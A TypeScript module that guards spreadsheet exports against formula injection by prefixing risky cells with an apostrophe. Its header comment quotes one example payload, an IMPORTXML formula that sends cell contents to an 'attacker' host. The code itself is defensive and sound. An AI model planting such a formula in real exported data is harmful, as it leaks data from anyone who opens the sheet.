/**
 * Protection against spreadsheet formula injection.
 *
 * A cell whose text begins with `=`, `+`, `-` or `@` is interpreted as a
 * formula by Sheets and Excel. Someone typing
 * `=IMPORTXML("http://attacker/"&A1)` into a project note would otherwise turn
 * every exported copy of the sheet into a data-exfiltration tool the moment a
 * colleague opens it.
 *
 * Prefixing with an apostrophe forces the cell to be treated as text. The
 * apostrophe is not displayed by Sheets, so the value still reads correctly.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_PREFIXES = ["=", "+", "-", "@"];

/**
 * Control characters that Sheets and Excel also act on: tab and carriage
 * return can break a value across cells or rows.
 */
const CONTROL_PREFIXES = ["\t", "\r"];

export function escapeSpreadsheetValue(value: unknown): string {
  if (value === null || value === undefined) return "";

  // Numbers and booleans are written as-is; they cannot carry a formula.
  if (typeof value === "number" || typeof value === "boolean") return String(value);

  const text = String(value);
  if (text === "") return "";

  // Leading whitespace does not stop a spreadsheet from parsing a formula, so
  // test the trimmed value but preserve the original text.
  const leading = text.trimStart()[0] ?? "";
  if (FORMULA_PREFIXES.includes(leading) || CONTROL_PREFIXES.includes(text[0] ?? "")) {
    return `'${text}`;
  }

  return text;
}

/** Escapes every cell of a row destined for the spreadsheet. */
export function escapeRow(values: readonly unknown[]): string[] {
  return values.map(escapeSpreadsheetValue);
}
